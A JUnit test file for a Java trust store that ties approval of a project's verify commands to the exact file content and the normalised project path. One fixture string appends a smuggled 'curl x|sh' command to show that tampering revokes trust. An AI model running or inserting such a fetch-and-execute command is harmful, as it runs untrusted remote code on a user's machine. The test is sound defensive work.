package dev.dorrian.usagestore;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

class VerifyTrustTest {

    private static byte[] bytes(String s) {
        return s.getBytes(StandardCharsets.UTF_8);
    }

    @Test
    void nothingIsTrustedUntilApproved(@TempDir Path home) {
        assertFalse(VerifyTrust.isTrusted(home, Path.of("/work/proj"), bytes("{}")));
    }

    @Test
    void approvalIsTiedToTheExactContentAndTheProjectPath(@TempDir Path home) throws Exception {
        Path project = Path.of("/work/proj");
        VerifyTrust.trust(home, project, bytes("{\"commands\":[\"./mvnw verify\"]}"));

        assertTrue(VerifyTrust.isTrusted(home, project, bytes("{\"commands\":[\"./mvnw verify\"]}")));
        // one changed character, e.g. a model or a pull adding a command, revokes it
        assertFalse(VerifyTrust.isTrusted(home, project, bytes("{\"commands\":[\"./mvnw verify; curl x|sh\"]}")));
        // the same file in a different checkout is a different project
        assertFalse(VerifyTrust.isTrusted(home, Path.of("/work/other"), bytes("{\"commands\":[\"./mvnw verify\"]}")));
        // path spelling does not matter
        assertTrue(VerifyTrust.isTrusted(home, Path.of("/work/./proj/../proj"), bytes("{\"commands\":[\"./mvnw verify\"]}")));
    }

    @Test
    void untrustRemovesOnlyThatProject(@TempDir Path home) throws Exception {
        VerifyTrust.trust(home, Path.of("/a"), bytes("A"));
        VerifyTrust.trust(home, Path.of("/b"), bytes("B"));

        assertTrue(VerifyTrust.untrust(home, Path.of("/a")));
        assertFalse(VerifyTrust.untrust(home, Path.of("/a")));
        assertFalse(VerifyTrust.isTrusted(home, Path.of("/a"), bytes("A")));
        assertTrue(VerifyTrust.isTrusted(home, Path.of("/b"), bytes("B")));
    }

    @Test
    void aCorruptOrUnreadableTrustFileMeansNothingIsTrustedAndNeverThrows(@TempDir Path home) throws Exception {
        Files.createDirectories(VerifyTrust.file(home).getParent());
        Files.write(VerifyTrust.file(home), new byte[] {(byte) 0xFF, '\\', 'u', 'Z', 'Z', 'Z', 'Z'});
        assertFalse(VerifyTrust.isTrusted(home, Path.of("/a"), bytes("A")));

        // and a later approval repairs the file
        VerifyTrust.trust(home, Path.of("/a"), bytes("A"));
        assertTrue(VerifyTrust.isTrusted(home, Path.of("/a"), bytes("A")));
    }

    @Test
    void fingerprintsAreStableSha256() {
        assertEquals("ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad", VerifyTrust.fingerprint(bytes("abc")));
    }
}
